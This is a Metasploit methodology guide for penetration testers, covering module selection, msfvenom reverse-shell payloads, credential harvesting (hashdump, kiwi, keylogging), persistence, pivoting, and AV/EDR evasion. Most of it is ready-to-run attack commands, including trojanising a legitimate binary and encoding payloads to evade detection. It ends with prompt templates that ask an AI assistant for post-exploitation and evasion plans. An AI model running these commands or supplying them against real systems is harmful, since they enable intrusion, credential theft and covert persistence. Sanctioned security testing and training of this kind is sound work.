---
id: "metasploit-decision-guide"
title: "Metasploit Decision Guide - When to Use What"
type: "methodology"
category: "network"
subcategory: "service-exploitation"
tags: ["metasploit", "exploit", "auxiliary", "post-exploitation", "msfvenom", "pivoting", "evasion", "methodology", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos"]
related: ["metasploit", "attack-workflow-chains", "vulnerability-priority-matrix", "reverse-shells-cheatsheet"]
updated: "2026-04-04"
---

## Overview

This guide teaches WHEN and HOW to use each component of the Metasploit Framework. It is not a reference card — it is a decision-making framework. The core philosophy: **use specialized tools for discovery, switch to Metasploit when you have something to exploit or need post-exploitation capabilities.**

---

## MSF vs Standalone Tools — Decision Matrix

Use this matrix to decide whether Metasploit or a standalone tool is the right choice for your current task.

| Task | Use Standalone Tool | Use Metasploit | Why |
|------|-------------------|----------------|-----|
| **Port scanning** | nmap, masscan, rustscan | db_nmap (if MSF DB is active) | Standalone scanners are faster and more flexible. Use db_nmap only when you want results auto-imported into the MSF database. |
| **Web vuln scanning** | nuclei, nikto, burpsuite | Rarely | Web scanners have vastly larger signature sets. MSF's HTTP auxiliary modules are limited by comparison. |
| **SQL injection** | sqlmap | Rarely | sqlmap is purpose-built with tamper scripts, WAF bypass, and OS shell capabilities that MSF cannot match. |
| **Directory brute force** | feroxbuster, gobuster, ffuf | No | MSF's dir_scanner is slow and limited. Always use dedicated tools. |
| **Subdomain enum** | subfinder, amass, assetfinder | No | MSF has no meaningful subdomain discovery. |
| **Service fingerprinting** | nmap -sV, whatweb | auxiliary/scanner/* | Use MSF auxiliary scanners when you need to check for specific vulnerabilities (e.g., ms17_010) rather than general fingerprinting. |
| **Credential brute force** | hydra, medusa, ncrack | auxiliary/scanner/*/login | MSF's login modules are solid and auto-store creds in the DB. Use MSF when you want credential storage and session integration. |
| **Exploiting a known CVE** | Sometimes (PoC scripts) | **Yes — primary use case** | MSF provides reliable, tested exploit code with integrated payload delivery and session management. |
| **Post-exploitation** | Manual enumeration, linpeas | **Yes — primary use case** | MSF post modules + meterpreter provide structured, repeatable post-exploitation with pivoting. |
| **Pivoting** | chisel, ligolo-ng, SSH tunnels | **Yes** | MSF autoroute + socks_proxy integrates directly with sessions. Combine with standalone tools for complex setups. |
| **Payload generation** | msfvenom (part of MSF) | **Yes** | msfvenom is the industry standard for generating encoded payloads in any format. |
| **Password hash cracking** | hashcat, john | No | MSF can dump hashes but cannot crack them. Always export to hashcat/john. |

### The Golden Rule

```
Discovery/Scanning  →  Standalone tools (nmap, nuclei, ffuf, sqlmap)
Exploitation        →  Metasploit (when a module exists) or standalone PoC
Post-Exploitation   →  Metasploit (meterpreter, post modules, pivoting)
```

If you find yourself forcing Metasploit into a scanning/discovery role, you are probably using the wrong tool. The exception is when you are already deep in an MSF session and need quick enumeration without switching contexts.

---

## The Five Pillars of Metasploit

### Pillar 1: Exploits

**When to use:** You have a confirmed vulnerable service with an identified CVE or known vulnerability class.

#### Searching Effectively

```bash
# Search by CVE (most precise)
search type:exploit cve:2021-44228        # Log4Shell
search type:exploit cve:2017-0144         # EternalBlue

# Search by service/product name
search type:exploit name:apache
search type:exploit name:tomcat

# Filter by quality — only use excellent/great rank for production targets
search type:exploit name:smb rank:excellent
search type:exploit name:ssh rank:great

# Combine filters
search type:exploit platform:linux cve:2021
search type:exploit name:wordpress rank:excellent

# Search by path (when you know the module area)
search path:exploit/linux/http
search path:exploit/windows/smb
```

#### Module Rank System

Always check the rank before using an exploit. This tells you how reliable and safe it is:

| Rank | Meaning | When to Use |
|------|---------|-------------|
| **ExcellentRanking** | Exploit never crashes the service, no brute force needed | Always safe to use. Preferred for production/in-scope targets. |
| **GreatRanking** | Has a default target that auto-detects, or uses a return address that is version-universal | Reliable. Use with confidence. |
| **GoodRanking** | Has a default target, usually the most common case | Usually works. May need target adjustment. |
| **NormalRanking** | Exploit is otherwise reliable but requires manual target selection | Needs research. Know your target's exact version/OS. |
| **AverageRanking** | Exploit is generally unreliable or difficult to exploit | Use only when no better option exists. Test in lab first. |
| **LowRanking** | Nearly impossible to exploit without customization | Last resort. Expect to modify the module source. |
| **ManualRanking** | Exploit is unstable or difficult to exploit and basically a DoS | Do not use on production targets. Lab only. |

#### Exploit Workflow

```
1. search type:exploit cve:XXXX-YYYY
2. use exploit/path/to/module
3. info                              # Read the full description, targets, references
4. show options                      # See required vs optional settings
5. show targets                      # Check available targets — pick the right one
6. set RHOSTS <target>
7. set PAYLOAD <appropriate payload>  # See Payload section for guidance
8. show advanced                     # Check for useful advanced options (SSL, proxies, etc.)
9. check                             # If available — verify vuln without exploiting
10. exploit                          # Or: run -j (background the session)
```

**Critical habit:** Always run `check` before `exploit` when the module supports it. This confirms the vulnerability without triggering the exploit, reducing noise and risk.

---

### Pillar 2: Auxiliary Modules

**When to use:** Scanning for specific vulnerabilities, brute-forcing credentials, enumerating services, or fuzzing. This is Metasploit's most underused pillar.

#### SMB Modules (Windows Networks)

```bash
# Vulnerability checking — run these on every Windows network
use auxiliary/scanner/smb/smb_ms17_010     # EternalBlue check (MS17-010)
set RHOSTS <range>
run

# Enumeration
use auxiliary/scanner/smb/smb_enumshares   # List accessible shares
use auxiliary/scanner/smb/smb_enumusers    # Enumerate users via SAM
use auxiliary/scanner/smb/smb_version      # OS version fingerprinting
use auxiliary/scanner/smb/pipe_auditor     # Named pipe enumeration

# Credential attacks
use auxiliary/scanner/smb/smb_login        # SMB credential brute force
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set BLANK_PASSWORDS true                   # Also try blank passwords
run
```

#### HTTP Modules

```bash
# Fingerprinting
use auxiliary/scanner/http/http_version    # Web server version
use auxiliary/scanner/http/ssl_version     # SSL/TLS version and ciphers
use auxiliary/scanner/http/robots_txt      # Check robots.txt

# Directory scanning (use feroxbuster instead for serious work)
use auxiliary/scanner/http/dir_scanner     # Basic directory brute force
use auxiliary/scanner/http/files_dir       # Interesting file finder

# Application-specific
use auxiliary/scanner/http/tomcat_mgr_login  # Tomcat manager brute force
use auxiliary/scanner/http/jenkins_login     # Jenkins credential check
use auxiliary/scanner/http/wordpress_login_enum  # WordPress brute force
```

#### SSH Modules

```bash
# User enumeration (exploits timing differences in auth responses)
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /path/to/users.txt
set RHOSTS <target>
run

# Credential brute force
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE false                          # Reduce noise
set STOP_ON_SUCCESS true                   # Stop after first valid cred
run
# Successful logins automatically open a session
```

#### FTP Modules

```bash
# Anonymous login check — always run this first
use auxiliary/scanner/ftp/ftp_anonymous
set RHOSTS <target>
run

# Credential brute force
use auxiliary/scanner/ftp/ftp_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Version detection
use auxiliary/scanner/ftp/ftp_version
```

#### MySQL / Database Modules

```bash
# Login brute force
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run

# Post-auth enumeration (if you have creds)
use auxiliary/scanner/mysql/mysql_hashdump      # Dump password hashes
use auxiliary/scanner/mysql/mysql_schemadump    # Dump schema
use auxiliary/admin/mysql/mysql_enum            # Full enumeration
use auxiliary/admin/mysql/mysql_sql             # Execute arbitrary SQL
```

#### Gather Modules (Information Gathering)

```bash
# DNS
use auxiliary/gather/dns_info              # DNS zone info
use auxiliary/gather/dns_bruteforce        # Subdomain brute force
use auxiliary/gather/enum_dns              # DNS record enumeration

# LDAP (Active Directory)
use auxiliary/gather/ldap_hashdump         # LDAP hash extraction
use auxiliary/gather/ldap_query            # Custom LDAP queries

# SNMP
use auxiliary/scanner/snmp/snmp_enum       # SNMP full enumeration
use auxiliary/scanner/snmp/snmp_login      # Community string brute force
```

#### Fuzzing Modules

```bash
# Protocol fuzzing
use auxiliary/fuzz/http/http_form_field    # Fuzz HTTP form fields
use auxiliary/fuzz/smtp/smtp_fuzzer        # SMTP protocol fuzzer
use auxiliary/fuzz/ftp/ftp_pre_post        # FTP command fuzzer

# Use these when you suspect a custom or unusual service implementation
# that might have buffer overflow or format string vulnerabilities
```

---

### Pillar 3: Payloads

**When to use:** Every time you exploit a target, you must select the right payload. This choice determines your capabilities post-exploitation.

#### Payload Types — When to Use Each

| Payload Type | Format | When to Use |
|-------------|--------|-------------|
| **Meterpreter** | `*/meterpreter/*` | Default choice. Full-featured: file ops, routing, privilege escalation, credential harvesting, screenshots, keylogging. |
| **Shell** | `*/shell/*` | When meterpreter is detected/blocked by AV, or target lacks necessary libraries (e.g., no Python/PHP for meterpreter). |
| **Command** | `cmd/*` | When you only need to run a single command (e.g., adding a user, downloading a file). Smallest footprint. |
| **Exec** | `*/exec` | Execute a single specified command. Use for targeted actions without interactive sessions. |

#### Staged vs Stageless — Decision Guide

**Staged** payloads use a `/` between payload and handler (e.g., `windows/x64/meterpreter/reverse_tcp`):

```
Stage 0 (stager) → Small, connects back to handler
                  → Handler sends Stage 1 (full meterpreter)
                  → Full session established
```

**Stageless** payloads use a `_` between payload and handler (e.g., `windows/x64/meterpreter_reverse_tcp`):

```
Full payload → Single shot, everything included
             → Connects back with full capabilities immediately
```

| Factor | Staged | Stageless |
|--------|--------|-----------|
| **Payload size** | Small initial (~10KB) | Large (~200KB+) |
| **Buffer space** | Use when exploit has limited buffer space | Need enough room for full payload |
| **Network reliability** | Needs stable connection for stage download | Works on unstable connections (one shot) |
| **AV evasion** | Stager callback pattern is well-signatured | Self-contained, easier to obfuscate as a whole |
| **Proxy/firewall** | May fail if deep packet inspection catches stage transfer | Better chance — single connection looks like normal traffic |
| **Offline targets** | Cannot work — needs handler for stage | Can be dropped and executed later |

**Rule of thumb:** Start with staged. Switch to stageless if the stager is caught by AV or the connection is unreliable.

#### msfvenom — Payload Generation

```bash
# List all available payloads
msfvenom -l payloads

# List formats
msfvenom -l formats

# --- Windows ---
# Staged meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Stageless meterpreter EXE
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# DLL (for DLL hijacking / sideloading)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o payload.dll

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-cmd

# ASP/ASPX web shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx

# --- Linux ---
# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Python payload (useful for targets with Python installed)
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.py

# --- Web ---
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

# JSP (Tomcat, JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp

# WAR (Tomcat deployment)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war

# JAR
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f jar -o shell.jar

# --- Encoding for AV evasion ---
# Shikata ga nai (polymorphic XOR encoder) — multiple iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Custom template (hide payload in legit binary)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -x /path/to/legit.exe -k -f exe -o trojan.exe
```

#### Handler Setup

Every reverse payload needs a handler. Always set up the handler BEFORE delivering the payload:

```bash
use exploit/multi/handler
set PAYLOAD <same payload used in msfvenom>
set LHOST <your IP>
set LPORT <your port>
set ExitOnSession false          # Keep listening for multiple callbacks
exploit -j                       # Run in background
```

---

### Pillar 4: Post-Exploitation Modules

**When to use:** You have an active session (shell or meterpreter) and need to enumerate, escalate, persist, pivot, or harvest credentials.

#### Enumeration — What to Run First

```bash
# ALWAYS run this first — finds local privilege escalation paths
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Linux enumeration
use post/linux/gather/enum_configs         # Config files (passwd, shadow, etc.)
use post/linux/gather/enum_network         # Network interfaces, routes, connections
use post/linux/gather/enum_system          # OS, kernel, installed packages
use post/linux/gather/checkvm              # Detect if running in a VM
use post/linux/gather/hashdump             # Dump /etc/shadow (needs root)
use post/linux/gather/enum_users_history   # Bash history, SSH keys, etc.

# Windows enumeration
use post/windows/gather/enum_applications  # Installed software
use post/windows/gather/enum_logged_on_users  # Currently logged in users
use post/windows/gather/enum_shares        # Network shares
use post/windows/gather/enum_domain        # Domain information
use post/windows/gather/enum_patches       # Missing patches (privesc hints)
use post/windows/gather/checkvm            # VM detection
```

#### Credential Harvesting

```bash
# Windows — Hash dumping
use post/windows/gather/hashdump           # SAM database hashes
set SESSION <id>
run

# Windows — Mimikatz / Kiwi (meterpreter only)
# In meterpreter:
load kiwi
creds_all                                  # Dump all credentials
creds_msv                                  # NTLM hashes
creds_kerberos                             # Kerberos tickets
creds_wdigest                              # Plaintext (if WDigest enabled)
lsa_dump_sam                               # SAM dump via LSA
lsa_dump_secrets                           # LSA secrets
golden_ticket_create                       # Create golden tickets

# Keylogging (meterpreter)
keyscan_start                              # Start capturing keystrokes
keyscan_dump                               # Dump captured keystrokes
keyscan_stop                               # Stop keylogging

# Linux credential gathering
use post/linux/gather/hashdump             # /etc/shadow
use post/linux/gather/enum_users_history   # Look for creds in bash history
use post/multi/gather/ssh_creds            # Harvest SSH keys
use post/multi/gather/firefox_creds        # Browser credentials
use post/multi/gather/filezilla_client_cred  # FileZilla saved creds
```

#### Persistence

```bash
# Linux persistence
use post/linux/manage/sshkey_persistence   # Add SSH authorized_key
set SESSION <id>
set PUBKEY /path/to/your/id_rsa.pub
run

use post/linux/manage/cron_persistence     # Cron-based callback

# Windows persistence
use exploit/windows/local/persistence_service  # Install as a service
use post/windows/manage/persistence_exe    # Drop persistent EXE
use exploit/windows/local/registry_persistence  # Registry run key

# Multi-platform
use post/multi/manage/shell_to_meterpreter  # Upgrade shell → meterpreter
```

#### Lateral Movement

```bash
# PSExec (pass-the-hash / pass-the-password)
use exploit/windows/smb/psexec
set RHOSTS <next target>
set SMBUser <user>
set SMBPass <password or NTLM hash>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# WMI execution
use exploit/windows/local/wmi_exec
# WinRM
use exploit/windows/winrm/winrm_script_exec

# Pass the hash with meterpreter token manipulation
# In meterpreter on compromised host:
load incognito
list_tokens -u                             # List available tokens
impersonate_token "DOMAIN\\Admin"          # Steal token
```

---

### Pillar 5: Evasion

**When to use:** AV/EDR is catching your payloads or traffic. Evasion is a cat-and-mouse game — no single technique works universally. Layer multiple approaches.

#### Encoders

```bash
# List available encoders
msfvenom -l encoders

# Key encoders:
# x86/shikata_ga_nai     — Polymorphic XOR, most popular, heavily signatured now
# x64/xor_dynamic        — XOR for 64-bit payloads
# x86/countdown          — Single-byte XOR countdown encoder
# cmd/powershell_base64  — Base64 encode PowerShell payloads

# Multiple encoding passes (diminishing returns past 3-5)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -e x86/shikata_ga_nai -i 3 -f exe -o evasive.exe

# Chain different encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -e x86/shikata_ga_nai -i 2 -f raw | \
  msfvenom -e x86/countdown -i 2 -f exe -o double_encoded.exe
```

#### Evasion Modules

```bash
# MSF 5+ evasion framework
use evasion/windows/windows_defender_exe    # Generate AV-evasive EXE
use evasion/windows/windows_defender_js_hta # HTA-based evasion

show options
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
generate                                    # Create evasive payload
```

#### Advanced Evasion Techniques

```bash
# Custom executable template — hide in legitimate binary
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -x /path/to/putty.exe -k -f exe -o putty_backdoored.exe

# NOP sleds — use alternative NOP generators
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> \
  -n 200 -f exe -o nop_payload.exe

# Sleep/delay in meterpreter to evade sandboxes
# In msfconsole handler:
set InitialAutoRunScript "sleep 30"        # Wait 30 seconds before activity
set AutoRunScript post/windows/manage/migrate  # Auto-migrate to stable process

# Process migration (evade process-based detection)
# In meterpreter:
migrate -N explorer.exe                    # Migrate to explorer
migrate -N svchost.exe                     # Migrate to svchost

# SSL/TLS encrypted payloads (avoid network-based detection)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 \
  -f exe -o https_payload.exe
# Use reverse_https over reverse_tcp — encrypted traffic blends with normal HTTPS

# Paranoid mode (certificate pinning for reverse HTTPS)
# Generate SSL cert:
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
  -keyout msf.key -out msf.crt
cat msf.key msf.crt > msf.pem
# In handler:
set HandlerSSLCert /path/to/msf.pem
set StagerVerifySSLCert true               # Only connect to YOUR handler
```

#### Evasion Mindset

Encoding alone is no longer sufficient against modern AV/EDR. Layer these approaches:

1. **Payload choice:** reverse_https > reverse_tcp (encrypted, blends with traffic)
2. **Encoding:** Multiple passes with different encoders
3. **Template injection:** Embed in legitimate executables with `-x` and `-k`
4. **Process migration:** Immediately migrate away from the initial process
5. **Sleep/delay:** Evade sandbox analysis with initial delays
6. **Certificate pinning:** Prevent traffic interception
7. **Custom payloads:** When all else fails, write custom shellcode loaders — MSF-generated payloads are heavily signatured

---

## Pivoting & Tunneling with MSF

### When to Pivot

You need to pivot when:
- You have compromised a host that can reach internal networks you cannot
- The target network is segmented and your next target is on a different subnet
- Firewall rules prevent direct access to internal services

### autoroute — Internal Network Routing

```bash
# In meterpreter session on compromised host:
run autoroute -s 10.10.10.0/24            # Route subnet through this session
run autoroute -p                           # Print active routes

# Or use the post module:
use post/multi/manage/autoroute
set SESSION <id>
set SUBNET 10.10.10.0
set NETMASK /24
run

# Now MSF modules can target 10.10.10.0/24 through the compromised host
# Example: scan internal network through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,443,445,3389
run
# Traffic automatically routes through the meterpreter session
```

### SOCKS Proxy — Tunnel Any Tool Through MSF

```bash
# Start SOCKS proxy in MSF
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5                              # SOCKS5
run -j

# Configure proxychains (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Now run ANY tool through the pivot:
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.100
proxychains ssh admin@10.10.10.50
proxychains firefox                        # Browse internal web apps
```

### Port Forwarding — Targeted Access

```bash
# In meterpreter session:

# Local port forward: access remote service on your local port
portfwd add -l 8080 -p 80 -r 10.10.10.100
# Now browse http://127.0.0.1:8080 to reach 10.10.10.100:80

# Reverse port forward: expose your local service to the target network
portfwd add -R -l 4444 -p 4444 -L 0.0.0.0
# Internal targets can now connect to the compromised host on port 4444
# which forwards to your machine

# List active port forwards
portfwd list

# Remove a forward
portfwd delete -l 8080 -p 80 -r 10.10.10.100

# Flush all forwards
portfwd flush
```

### Double/Triple Pivots

For multi-hop pivots where you chain through several compromised hosts:

```
Attacker → Host A (Session 1) → Host B (Session 2) → Host C (Target)
```

```bash
# Step 1: Compromise Host A, set up route to Host B's network
# Session 1 = meterpreter on Host A
run autoroute -s 10.10.10.0/24            # Host B's subnet

# Step 2: Exploit Host B through the route
use exploit/linux/http/some_exploit
set RHOSTS 10.10.10.50                     # Host B — traffic routes through Session 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your IP>                        # Handler still on your machine
run
# Session 2 opens

# Step 3: Route Host C's network through Session 2
use post/multi/manage/autoroute
set SESSION 2
set SUBNET 172.16.0.0
set NETMASK /24
run

# Step 4: Now MSF can reach 172.16.0.0/24 through Session 1 → Session 2
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.0/24
set PORTS 22,80,445
run
```

### Combining MSF Pivoting with External Tools

```bash
# MSF autoroute + SOCKS proxy + chisel for maximum flexibility:

# 1. autoroute through MSF session (reaches first internal subnet)
run autoroute -s 10.10.10.0/24

# 2. Start MSF SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# 3. Upload chisel to compromised host (for faster tunneling)
# In meterpreter:
upload /path/to/chisel /tmp/chisel
shell
chmod +x /tmp/chisel
/tmp/chisel client <your_ip>:8000 R:socks
# Gives you a second SOCKS proxy — use whichever is faster

# 4. For SSH tunnel overlay:
# If you have SSH creds on an internal host:
proxychains ssh -D 9050 user@10.10.10.50
# Now you have: proxychains → MSF SOCKS → SSH dynamic forward
# Access deeper networks through the SSH tunnel
```

---

## MSF + Tool Integration

### Importing External Scan Results

```bash
# Start the MSF database
msfdb init
msfconsole

# In msfconsole:
db_status                                  # Verify database connection

# Import nmap XML results
db_import /path/to/nmap_scan.xml

# Import Nessus results
db_import /path/to/nessus_scan.nessus

# Import other supported formats (Acunetix, Burp, OpenVAS, etc.)
db_import /path/to/scan_results.xml

# After import, query the database:
hosts                                      # List all discovered hosts
services                                   # List all discovered services
vulns                                      # List all discovered vulnerabilities
creds                                      # List all captured credentials
loot                                       # List all captured loot

# Filter queries
hosts -S 10.10.10                          # Hosts matching subnet
services -p 445                            # Services on port 445
services -s http                           # HTTP services
vulns -S ms17                              # Vulnerabilities matching "ms17"
```

### Integrated Scanning with db_nmap

```bash
# Run nmap directly from MSF with auto-import
db_nmap -sV -sC -O -p- 10.10.10.0/24

# Results automatically populate hosts, services, and vulns tables
services -p 445 -R                         # Set RHOSTS from service query
# Now run an exploit against all hosts with port 445:
use exploit/windows/smb/ms17_010_eternalblue
# RHOSTS is already set from the services command
run
```

### Feeding External Tool Findings into MSF

```bash
# Nuclei found a CVE — search for MSF module:
# nuclei output: [CVE-2021-26855] [critical] https://target.com
search type:exploit cve:2021-26855

# searchsploit found an exploit — check if MSF has it:
# searchsploit output: Microsoft Exchange Server - ProxyLogon RCE | windows/remote/49637.py
search name:proxylogon
search name:exchange type:exploit

# Nmap found a service version — find matching exploits:
# nmap: 445/tcp open microsoft-ds Windows Server 2016 Standard 14393
search type:exploit name:smb platform:windows

# Hydra found creds — use them in MSF:
# hydra found: [22][ssh] host: 10.10.10.50  login: admin  password: P@ssw0rd
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.50
set USERNAME admin
set PASSWORD P@ssw0rd
run
# Opens a session automatically
```

### Exporting MSF Data

```bash
# Export workspace data for reporting
# In msfconsole:
hosts -o /tmp/hosts.csv                    # Export hosts
services -o /tmp/services.csv             # Export services
vulns -o /tmp/vulns.csv                   # Export vulnerabilities
creds -o /tmp/creds.csv                   # Export credentials
loot -o /tmp/loot.csv                     # Export loot

# For structured reporting, use workspaces:
workspace -a engagement_name              # Create new workspace
workspace engagement_name                 # Switch to it
# All data is now isolated to this workspace
workspace -l                              # List workspaces
```

---

## Decision Flowchart

```
Found open port/service?
│
├─→ Is there a known CVE?
│     ├─→ YES → search type:exploit cve:XXXX-YYYY
│     │         ├─→ Module exists with rank >= good → use it
│     │         └─→ No module / low rank → check searchsploit, use standalone PoC
│     │
│     └─→ NO / UNSURE → Fingerprint first
│           ├─→ auxiliary/scanner/*/version → identify service version
│           ├─→ search type:exploit name:<service> → browse available exploits
│           └─→ Still unsure → nuclei, nmap scripts, manual testing
│
├─→ Need credentials?
│     ├─→ auxiliary/scanner/<proto>/<proto>_login → brute force with wordlists
│     ├─→ Set STOP_ON_SUCCESS true, VERBOSE false
│     └─→ Valid creds found → auto-session or use in exploit module
│
├─→ Unknown/custom service?
│     ├─→ auxiliary/scanner/* for protocol fingerprinting
│     ├─→ auxiliary/fuzz/* if you suspect memory corruption
│     └─→ Manual analysis with ncat/Wireshark
│
Got a shell?
│
├─→ Basic shell (not meterpreter)?
│     └─→ sessions -u <id>                → upgrade to meterpreter
│
├─→ Meterpreter session active?
│     ├─→ FIRST: post/multi/recon/local_exploit_suggester → find privesc paths
│     ├─→ getuid / sysinfo / ifconfig      → understand where you are
│     │
│     ├─→ Need to pivot?
│     │     ├─→ run autoroute -s <internal_subnet>
│     │     ├─→ auxiliary/server/socks_proxy → proxychains for external tools
│     │     └─→ portfwd for targeted access to specific services
│     │
│     ├─→ Need credentials?
│     │     ├─→ hashdump                    → SAM / shadow hashes
│     │     ├─→ load kiwi → creds_all      → mimikatz (Windows)
│     │     └─→ keyscan_start              → capture keystrokes
│     │
│     ├─→ Need persistence?
│     │     ├─→ post/linux/manage/sshkey_persistence
│     │     ├─→ post/windows/manage/persistence_exe
│     │     └─→ Scheduled task / cron-based persistence modules
│     │
│     └─→ Need lateral movement?
│           ├─→ exploit/windows/smb/psexec → pass-the-hash
│           ├─→ load incognito → impersonate_token → token theft
│           └─→ Use harvested creds with ssh_login / smb_login
│
Done exploiting?
│
├─→ Document everything: hosts, services, vulns, creds, loot
├─→ Export: hosts -o, services -o, vulns -o, creds -o
└─→ Clean up: sessions -K, remove artifacts from targets
```

---

## Deep Dig Prompts

Use these prompts when you have a specific target and want to go deep with Metasploit:

### Prompt 1: Service-Specific Module Deep Dive

```
I found [SERVICE] version [VERSION] on [TARGET_IP]:[PORT].
Search for all MSF exploit, auxiliary, and scanner modules that target this
exact service and version. For each module found:
1. Show the module rank and description
2. Tell me if it has a 'check' command
3. Recommend whether to use it or a standalone tool instead
4. If using it, show the exact commands with optimal settings
```

### Prompt 2: Post-Exploitation Game Plan

```
I have a [meterpreter/shell] session on [OS_TYPE] [OS_VERSION] as user [USERNAME].
Build me a complete post-exploitation plan using MSF modules:
1. What enumeration modules to run and in what order
2. Privilege escalation paths to check (local_exploit_suggester + manual checks)
3. What credentials to harvest and how
4. Network reconnaissance from this host (ifconfig, arp, routes)
5. Whether pivoting is useful and how to set it up
6. Persistence options ranked by stealth
```

### Prompt 3: Evasion Strategy Builder

```
My payload is being caught by [AV/EDR PRODUCT] on [TARGET OS].
Help me build an evasion strategy:
1. Which payload type and communication channel to use
2. Encoding approach (which encoders, how many iterations)
3. Template injection options
4. Process migration targets on the target OS
5. Traffic encryption options
6. If MSF evasion won't work, suggest alternative payload generation tools
```
